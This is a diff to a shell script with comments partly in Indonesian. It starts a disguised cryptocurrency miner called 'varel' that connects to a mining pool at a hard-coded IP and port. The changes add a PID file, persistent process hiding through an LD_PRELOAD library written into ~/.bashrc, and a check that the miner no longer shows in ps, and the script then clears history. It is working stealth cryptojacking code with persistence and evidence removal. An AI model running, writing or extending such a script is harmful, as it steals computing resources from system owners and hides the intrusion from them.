@@ -80,16 +80,22 @@ if [ ! -f ~/varel ]; then
 fi
 
 # === Generate random worker ID ===
-RANDOM_WORKER="v11d5exukktuwl8geceiwini8jhqcpk1bj3u8xw.$(shuf -n 1 -i 10000-99999)-w$(date +%s)"
+RANDOM_WORKER="v11d5exukktuwl8geceiwini8jhqcpk1bj3u8xw.$(shuf -n 1 -i 10000-99999)-wwww$(date +%s)"
 
-# === Kill old process if exists ===
+# === Kill old process if exists (CEK TANPA LD_PRELOAD) ===
+unset LD_PRELOAD
 pkill -f "varel.*randomvirel" 2>/dev/null || true
 sleep 2
 
-# === Start varel with process hiding ===
-echo "🚀 Starting varel (hidden process)..."
-export LD_PRELOAD=~/.libhider.so
+# === Cek apakah masih ada process lama ===
+if pgrep -f "varel" >/dev/null 2>&1; then
+    echo "⚠️ Old varel process still running, force kill..."
+    pkill -9 -f "varel" 2>/dev/null || true
+    sleep 2
+fi
 
+# === Start varel TANPA hiding dulu untuk cek ===
+echo "🚀 Starting varel..."
 nohup ~/varel -a randomvirel \
   --url 137.184.31.121:443 \
   --user "$RANDOM_WORKER" \
@@ -98,23 +104,48 @@ nohup ~/varel -a randomvirel \
   --log-file=~/run.log \
   > /dev/null 2>&1 &
 
-sleep 3
+VAREL_PID=$!
+echo "📌 Varel PID: $VAREL_PID"
 
-# === Verify ===
-if pgrep -f "varel.*randomvirel" >/dev/null; then
+# Simpan PID ke file untuk monitoring
+echo $VAREL_PID > ~/.varel.pid
+
+sleep 5
+
+# === Verify process running (masih tanpa hiding) ===
+if kill -0 $VAREL_PID 2>/dev/null; then
     echo "✅ Varel started successfully!"
     echo "📊 Worker ID: $RANDOM_WORKER"
     echo "📝 Log file: ~/run.log"
+    echo "🔐 PID saved to: ~/.varel.pid"
     
-    # Test process hiding
+    # Show initial log
+    if [ -f ~/run.log ]; then
+        echo ""
+        echo "📄 Initial log output:"
+        tail -5 ~/run.log
+    fi
+    
+    # NOW activate hiding for future commands
+    echo ""
+    echo "🎭 Activating process hiding..."
+    export LD_PRELOAD=~/.libhider.so
+    echo 'export LD_PRELOAD=~/.libhider.so' >> ~/.bashrc
+    
+    # Test hiding
     if ps aux | grep -v grep | grep -q varel; then
-        echo "⚠️ Process still visible in ps"
+        echo "⚠️ Process still visible (hiding may not work)"
     else
-        echo "✅ Process hidden from ps"
+        echo "✅ Process hidden from ps/top/pgrep"
     fi
 else
     echo "❌ Failed to start varel"
-    tail -20 ~/run.log 2>/dev/null || echo "No log file"
+    if [ -f ~/run.log ]; then
+        echo ""
+        echo "📄 Error log:"
+        tail -20 ~/run.log
+    fi
+    exit 1
 fi
 
 # Clear history
